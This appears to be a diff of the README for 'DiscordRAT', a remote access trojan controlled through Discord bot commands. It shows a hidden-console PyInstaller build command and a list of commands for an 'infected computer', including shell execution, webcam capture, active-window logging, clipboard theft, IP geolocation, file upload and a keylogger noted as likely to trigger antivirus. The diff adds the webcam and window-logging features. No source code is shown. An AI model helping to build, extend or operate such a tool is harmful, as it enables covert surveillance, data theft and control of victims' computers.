@@ -43,7 +43,9 @@ PyInstaller --onefile --noconsole --hidden-import=discord DiscordRAT.py
 Availaible commands are :
 --> !message = Show a message box displaying your text / Syntax  = "!message example"
 --> !shell = Execute a shell command /Syntax  = "!shell whoami"
---> !window = Get infected computer user current active window
+--> !webcampic = Take a picture from the webcam
+--> !windowstart = Start logging current user window (logging is shown in the bot activity)
+--> !windowstop = Stop logging current user window 
 --> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
 --> !admincheck = Check if program has admin privileges
 --> !sysinfo = Gives info about infected computer
@@ -52,7 +54,7 @@ Availaible commands are :
 --> !upload = Upload file from website to computer / Syntax = "!upload file.png" (with attachment)
 --> !cd = Changes directory
 --> !write = Type your desired sentence on infected computer
---> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with image attachment)
+--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper C:/Users/UserExemple/wallpaper.jpg"
 --> !clipboard = Retrieve infected computer clipboard content
 --> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
 --> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
